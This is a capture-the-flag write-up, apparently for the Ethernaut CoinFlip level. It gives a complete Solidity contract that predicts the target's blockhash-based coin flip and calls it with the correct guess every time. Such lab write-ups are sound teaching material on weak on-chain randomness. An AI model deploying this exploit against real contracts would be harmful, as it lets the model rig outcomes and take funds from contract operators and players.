In this challenge, you learn how to create smart contracts that interact with other deployed smart contracts through interfaces.


### Solution

First, copy the address of the original smart contract:
```
await contract.address();
```

Then, copy the original smart contract into and do some changes on it:
1. Add the interface block, which is needed to interact with the original smart contract
2. Compute the side of the coin the same way that the original smart contract will do to check our choice
3. Call the original smart contract with the guess

```
pragma solidity ^0.7.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipGuess {
    uint256 public consecutiveWins = 0;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function guess(address _coinFlipAddr) external returns (uint256) {

        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue/FACTOR;
        bool side = coinFlip == 1 ? true : false;

        bool isRight = ICoinFlip(_coinFlipAddr).flip(side);
        if (isRight) {
            consecutiveWins++;
        } else {
            consecutiveWins = 0;
        }

        return consecutiveWins;

    }

}
```